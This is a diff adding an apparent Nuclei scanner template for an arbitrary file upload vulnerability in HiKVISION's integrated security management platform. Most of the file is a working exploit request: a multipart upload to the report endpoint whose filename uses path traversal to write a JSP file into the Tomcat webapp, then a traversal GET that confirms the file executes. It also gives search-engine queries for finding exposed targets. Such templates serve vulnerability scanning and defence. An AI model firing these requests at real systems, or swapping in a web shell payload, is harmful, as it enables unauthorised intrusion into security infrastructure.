@@ -1,0 +1,38 @@
+id: hikvision_report_upload
+info:
+  name: HiKVISION 综合安防管理平台report文件上传
+  author: Xc1Ym
+  severity: critical
+  description: 海康威视综合安防管理平台report接口存在任意文件上传
+  metadata:
+    max-request: 1
+    fofa-query: title=="综合安防管理平台"
+    hunter-query: web.title=="综合安防管理平台"
+    verified: true
+  tags: upload,iot,hikvision,hw,intrusive
+http:
+  - raw:
+      - |
+        POST /svm/api/external/report HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+        Content-Length: 313
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/qaxnb.jsp"
+        Content-Type: application/zip
+
+        <%out.println("Hello World");%>
+
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+      - |
+        GET /portal/ui/login/..;/..;/qaxnb.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2==200"
+          - "contains(body_2, 'Hello World')"
+        condition: and
+# digest: 4a0a00473045022006afc564a97026aa2f167bd2c530cb997d69e067d868d706f3c75f8ee64d8941022100d8a491e3558170204e4173b829d5551f7465dd4bb3aa2181f06b99bfaffb6cd7:6b2dd5af372f02ed15a56faf8ad98cf9
